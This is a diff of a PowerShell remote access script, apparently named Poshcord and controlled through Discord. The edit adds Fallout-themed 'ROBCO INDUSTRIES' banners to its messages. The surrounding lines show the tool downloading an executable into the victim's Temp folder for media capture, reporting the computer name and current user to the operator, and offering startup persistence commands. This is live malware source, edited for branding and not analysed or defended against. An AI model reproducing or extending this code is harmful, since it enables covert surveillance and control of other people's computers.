@@ -41,7 +41,7 @@ $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 # =============================================================== MODULE FUNCTIONS =========================================================================
 # Download ffmpeg.exe function (dependency for media capture) 
 Function GetFfmpeg{
-    sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
+    sendMsg -Message ":hourglass: ``Downloading UOS to Client.. Please Wait`` :hourglass:"
     $Path = "$env:Temp\ffmpeg.exe"
     $tempDir = "$env:temp"
     If (!(Test-Path $Path)){  
@@ -208,6 +208,8 @@ Function quickInfo{
             @{
                 title       = "$env:COMPUTERNAME | Computer Information "
                 "description" = @"
+`````ROBCO INDUSTRIES UNIFIED OPERATING SYSTEM``````
+```````COPYTIGHT 2075-2077 ROBCO INDUSTRIES``````
 ``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
 :man_detective: **User Information** :man_detective:
 - **Current User**          : ``$env:USERNAME``
@@ -268,7 +270,8 @@ $script:jsonPayload = @{
         @{
             title       = "$env:COMPUTERNAME | Commands List "
             "description" = @"
-
+`````ROBCO INDUSTRIES UNIFIED OPERATING SYSTEM``````
+```````COPYTIGHT 2075-2077 ROBCO INDUSTRIES``````
 ### SYSTEM
 - **AddPersistance**: Add this script to startup.
 - **RemovePersistance**: Remove Poshcord from startup
@@ -332,7 +335,8 @@ $script:jsonPayload = @{
         @{
             title       = "$env:COMPUTERNAME | Extra Information "
             "description" = @"
-``````Example Commands``````
+`````ROBCO INDUSTRIES UNIFIED OPERATING SYSTEM``````
+```````COPYTIGHT 2075-2077 ROBCO INDUSTRIES``````
 
 **Default PS Commands:**
 > PS> ``whoami`` (Returns Powershell commands)
